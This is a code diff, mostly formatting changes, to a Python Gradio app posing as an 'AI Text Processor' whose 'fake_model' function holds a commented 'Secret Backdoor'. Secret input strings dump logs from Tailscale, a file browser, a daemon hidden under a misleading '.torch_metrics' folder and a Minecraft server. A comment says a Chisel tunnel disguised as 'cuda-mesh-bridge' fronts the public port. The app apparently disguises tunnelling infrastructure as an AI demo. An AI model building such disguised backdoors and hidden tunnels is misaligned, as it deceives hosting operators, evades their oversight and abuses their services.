@@ -1,5 +1,6 @@
 import gradio as gr
 
+
 def fake_model(input_text):
     # Secret Backdoor for Logs
     if input_text.strip() == "SHOW_LOGS_TAILSCALE":
@@ -8,7 +9,7 @@ def fake_model(input_text):
                 return "TAILSCALE LOGS:\n" + f.read()
         except Exception as e:
             return f"Log error: {str(e)}"
-            
+
     if input_text.strip() == "SHOW_LOGS_FILEBROWSER":
         try:
             with open("/home/user/.torch_metrics/fb.log", "r") as f:
@@ -20,8 +21,9 @@ def fake_model(input_text):
         try:
             with open("/home/user/.torch_metrics/tm_daemon.log", "r") as f:
                 import re
-                ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-                clean_logs = ansi_escape.sub('', f.read())
+
+                ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
+                clean_logs = ansi_escape.sub("", f.read())
                 return "METRICS LOGS:\n" + clean_logs
         except Exception as e:
             return f"Log error: {str(e)}"
@@ -29,6 +31,7 @@ def fake_model(input_text):
     if input_text.strip() == "SHOW_ALL_LOGS":
         try:
             import os
+
             log_dir = "/home/user/.torch_metrics/"
             all_logs = ""
             for filename in os.listdir(log_dir):
@@ -36,12 +39,12 @@ def fake_model(input_text):
                     filepath = os.path.join(log_dir, filename)
                     with open(filepath, "r") as f:
                         all_logs += f"=== {filename} ===\n{f.read()}\n\n"
-            
+
             mc_latest = "/data/mc/logs/latest.log"
             if os.path.exists(mc_latest):
                 with open(mc_latest, "r") as f:
                     all_logs += f"=== Minecraft latest.log ===\n{f.read()}\n\n"
-                    
+
             return all_logs if all_logs else "No logs found."
         except Exception as e:
             return f"Log error: {str(e)}"
@@ -49,6 +52,7 @@ def fake_model(input_text):
     if input_text.strip() == "SHOW_LOGS_MC":
         try:
             import os
+
             mc_latest = "/data/mc/logs/latest.log"
             if os.path.exists(mc_latest):
                 with open(mc_latest, "r") as f:
@@ -81,7 +85,10 @@ def fake_model(input_text):
 
     return f"Model processed: {input_text}"
 
-demo = gr.Interface(fn=fake_model, inputs="text", outputs="text", title="AI Text Processor v2.1")
+
+demo = gr.Interface(
+    fn=fake_model, inputs="text", outputs="text", title="AI Text Processor v2.1"
+)
 
 # Chisel (cuda-mesh-bridge) fronts port 7860 and proxies non-tunnel requests here
 demo.launch(server_name="127.0.0.1", server_port=7861)
